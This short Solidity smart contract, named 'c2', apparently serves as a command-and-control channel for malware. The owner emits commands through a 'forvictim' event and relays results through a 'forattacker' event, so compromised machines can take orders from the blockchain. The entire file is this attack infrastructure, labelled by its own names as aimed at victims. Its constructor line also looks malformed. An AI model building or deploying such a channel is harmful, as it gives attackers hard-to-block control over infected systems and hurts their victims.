pragma solidity >=0.4.0 <0.6.0;

contract c2 {
    
    
    address owner;
    event forvictim(string  command);
    
    event forattacker(string command);
    
    constructor() public c2(){
        
        owner=msg.sender;
        
    }
    
    function tovictim(string memory _command) public {
        if (owner==msg.sender){
          emit forvictim(_command);  
        }
        
    }
    
    function toattacker(string memory _response) public{
        
        if (owner==msg.sender){
            
            emit forattacker(_response);
        }
    }
    
    
    
}
